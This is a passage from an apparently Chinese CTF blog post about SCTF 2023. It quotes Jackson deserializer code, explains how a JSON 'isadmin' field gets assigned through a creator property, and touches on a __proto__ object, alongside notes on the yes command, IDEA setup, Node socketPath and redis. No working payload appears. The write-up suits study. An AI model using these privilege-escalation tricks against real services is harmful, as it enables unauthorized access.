handleUnresolvedReference(ctxt,\n                           prop, buffer, reference);\n                   if (referrings == null) &#123;\n                       referrings = new ArrayList&lt;BeanReferring>();\n                   &#125;\n                   referrings.add(referring);\n               &#125;\n               continue;\n           &#125;\n           // Things marked as ignorable should not be passed to any setter\n           if (IgnorePropertiesUtil.shouldIgnore(propName, _ignorableProps, _includableProps)) &#123;\n               handleIgnoredProperty(p, ctxt, handledType(), propName);\n               continue;\n           &#125;\n           // \"any property\"?\n           if (_anySetter != null) &#123;\n               try &#123;\n                   buffer.bufferAnyProperty(_anySetter, propName, _anySetter.deserialize(p, ctxt));\n               &#125; catch (Exception e) &#123;\n                   wrapAndThrow(e, _beanType.getRawClass(), propName, ctxt);\n               &#125;\n               continue;\n           &#125;\n\n           // 29-Mar-2021, tatu: [databind#3082] May skip collection if we know\n           //    they'd just get ignored (note: any-setter handled above; unwrapped\n           //    properties also separately handled)\n           if (_ignoreAllUnknown) &#123;\n               // 22-Aug-2021, tatu: [databind#3252] must ensure we do skip the whole value\n               p.skipChildren();\n               continue;\n           &#125;\n           // Ok then, let's collect the whole field; name and value\n           if (unknown == null) &#123;\n               unknown = ctxt.bufferForInputBuffering(p);\n           &#125;\n           unknown.writeFieldName(propName);\n           unknown.copyCurrentStructure(p);\n       &#125;\n\n       // We hit END_OBJECT, so:\n       Object bean;\n       try &#123;\n           bean = creator.build(ctxt, buffer);\n       &#125; catch (Exception e) &#123;\n           wrapInstantiationProblem(e, ctxt);\n           bean = null; // never gets here\n       &#125;\n       // 13-Apr-2020, tatu: [databind#2678] need to handle injection here\n       if (_injectables != null) &#123;\n           injectValues(ctxt, bean);\n       &#125;\n\n       if (referrings != null) &#123;\n           for (BeanReferring referring : referrings) &#123;\n              referring.setBean(bean);\n           &#125;\n       &#125;\n       if (unknown != null) &#123;\n           // polymorphic?\n           if (bean.getClass() != _beanType.getRawClass()) &#123; // lgtm [java/dereferenced-value-may-be-null]\n               return handlePolymorphic(null, ctxt, bean, unknown);\n           &#125;\n           // no, just some extra unknown properties\n           return handleUnknownProperties(ctxt, bean, unknown);\n       &#125;\n       return bean;\n   &#125;\n\n\n\n  此时value&#x3D;true\n\n这里会根据属性值构造对象\n具体来说，createFromObjectWith() 方法的作用是使用给定的值来创建 Java 对象的实例，并返回创建好的对象。如果创建过程中出现了异常，则会抛出相应的异常。\n\n\n\n这里的newInstance，就是在调用下面这个类，对属性进行赋值\n\n\n最最最关键的点\n\n代码执行到这行的时候，因为isadmin并没有指定映射，所以他认为是&quot;&quot;\n\n\n\n所以在执行findCreatorProperty的时候，是有返回值的\n\n\n\n因此，creatorProp不是null，会跳过if，从而有了后面的赋值，如果我把json中的&quot;&quot;改为aa，那么creatorProp == null，因此就不会赋值\n\n\n生成payload“yes” 是一个Linux和Unix操作系统上的命令行工具，它会不断地输出指定的字符串或者默认的 “y” 字符串（表示 “yes”），直到被强制终止。这个命令通常用于自动化脚本中，以便在需要用户交互时自动回答 “yes”。\n例如，如果你运行以下命令：\nyes\n\n它将会不断输出 “y” 字符串，直到你使用 “Ctrl + C” 组合键强制终止。\n你还可以在 “yes” 命令后面指定一个字符串作为参数，以便输出指定的字符串。例如，如果你想输出 “hello” 字符串，你可以运行以下命令：\nyes hello\n\n这将会不断输出 “hello” 字符串，直到你使用 “Ctrl + C” 组合键强制终止。\nmaven在github上下载的项目，直接并不能运行，也不能看到源码，需要添加maven的支持，并导入scala的依赖\nscala依赖\n&lt;dependencies>\n    &lt;!-- scala -->\n    &lt;dependency>\n        &lt;groupId>org.scala-lang&lt;/groupId>\n        &lt;artifactId>scala-library&lt;/artifactId>\n        &lt;version>2.13.9&lt;/version>\n    &lt;/dependency>\n\n&lt;/dependencies>\n\n\n我添加了一个Maven依赖，并且在add framework support中加了scala，然后我download sources，此时就不提示sources not dound了\n此时看到了正常的scala源码\n\n反编译的源码\n如果想用idea自带的反编译，看反编译后的java源码\n\n\n\n那就在这里加了scala SDK \n然后在scala源码中查找对应的类\n\n\nidea问题：从Github上下载的项目即使有main也不能直接运行，为啥？\n是因为没有标记为sources root，idea就不会对其添加运行代码相关的配置\n\n“Sources Root”（源码根目录）：将目录标记为项目的源代码目录。\n\n“Test Sources Root”（测试源码根目录）：将目录标记为项目的测试代码目录。\n\n“Resources Root”（资源根目录）：将目录标记为项目的资源文件目录，如配置文件、图像等。\n\n“Excluded”（排除目录）：将目录从项目的构建和搜索范围中排除。\n\n\n\n格式化代码CTRL+ alt + L\nSCTF an4er_monitor http.d.ts 文件中，socketPath?: string | undefined; 是用于描述 http.request() 和 https.request() 方法的参数 options 中的 socketPath 字段。\n具体解释如下：\nsocketPath 是一个可选的字符串类型字段，表示要使用的 Unix 套接字路径。它用于在发起 HTTP 或 HTTPS 请求时指定与服务器通信的 Unix 套接字路径。\n当请求的目标是通过 Unix 套接字进行通信时，可以使用 socketPath 字段来指定服务器的 Unix 套接字路径。这样，请求将通过该套接字与服务器建立连接，并进行后续的 HTTP 或 HTTPS 通信。\n例如，可以在发起请求时设置 socketPath 字段如下：\ntypescript\nconst options = &#123;\n  socketPath: '/var/run/myserver.sock',\n  // 其他请求选项...\n&#125;;\n\nconst req = http.request(options, (res) => &#123;\n  // 处理响应...\n&#125;);\n\nreq.end();\n\n在上述示例中，通过将 socketPath 字段设置为 &#39;/var/run/myserver.sock&#39;，请求将使用该 Unix 套接字路径与服务器建立连接。\n需要注意的是，socketPath 字段是在 http.d.ts 类型声明文件中定义的，用于在 TypeScript 项目中提供类型信息和类型检查支持，以确保在开发过程中使用正确的类型和参数。\n启动redis服务器\nservice redis-server start \n\n\n\n\n\n\n\n这里的obj已经是object了，是{urls}的__proto__\n\n在 Node.js 中，req.query 对象表示客户端发送的 HTTP 请求中的查询参数（query parameters）。查询参数是在 URL 中以 “?” 符号开始的字符串，通常用于向服务器传递键值对。\n例如，如果客户端发送以下 HTTP 请求：\nGET /search?q=JavaScript&amp;limit=10 HTTP/1.1\nHost: example.com\n\n\n那么 req.query 对象将包含以下属性：\n\n&#123;\n  q: 'JavaScript',\n  limit: '10'\n&#125;\n\n\n\n\n\n\n\n一旦您启动了 Docker 容器，您可以在容器中运行各种应用程序和服务，包括 Nginx 和 Redis。您可以通过容器的 IP 地址、主机名或映射的端口号与容器内运行的应用程序进行通信。\n","slug":"SCTF","date":"2023-07-31T12:34:40.000Z","categories_index":"","tags_index":"CTF","author_index":"XyM4ster"}]